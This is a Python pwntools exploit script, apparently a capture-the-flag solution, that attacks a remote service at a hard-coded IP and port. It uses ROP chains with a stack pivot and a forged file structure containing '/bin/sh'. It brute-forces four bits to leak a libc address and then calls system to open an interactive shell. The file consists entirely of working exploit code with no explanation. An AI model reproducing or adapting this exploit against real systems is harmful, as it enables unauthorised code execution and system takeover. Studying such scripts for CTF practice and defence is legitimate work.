from pwn import *


rsp = 0x000000000601300

prdi = 0x000000000040049c
prsi = 0x000000000040049e
prbp = 0x000000000040047c
leaveret = 0x0000000000400499
read = 0x0000000000400410
_start = 0x0000000000400430

while True : 
    try : 
        #p = process("./chall")
        p = remote("13.231.207.73",9002)

        pay = "A" * 0x20
        pay += p64(rsp-8)
        pay += p64(prsi)
        pay += p64(rsp)
        pay += p64(read)
        pay += p64(leaveret)


        p.send(pay)
        sleep(0.5)

        fakestruct =  "\x00" * (0x70-8) + "/bin/sh\x00" + p64(1)

        p.send(p64(_start) + fakestruct)


        pay2 = ""
        pay2 += "A" * 0x20
        pay2 += p64(0x6012c0 - 8) # call _IO_new_file_write
        pay2 += p64(prsi)
        pay2 += p64(0x6012c0)
        pay2 += p64(read)

        pay2 += p64(prsi)
        pay2 += p64(0x6012c8)
        pay2 += p64(read)


        pay2 += p64(prdi) 
        pay2 += p64(0x601308) #fake struct
        pay2 += p64(prsi)
        pay2 += p64(0x601290)

        pay2 += p64(leaveret)

        sleep(0.5)
        p.send(pay2)

        sleep(0.5)
        p.send("\x70\xbb") # 4bit need bruteforce

        sleep(0.5)
        p.send(p64(_start)) # rop

        
        libc = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - 0x78bff

        print hex(libc)

        sleep(0.5)
        p.send("A"*0x28 + p64(prdi) + p64(0x601370) + p64(libc+0x45390))


        p.interactive()
        break
    except : 
        p.close()
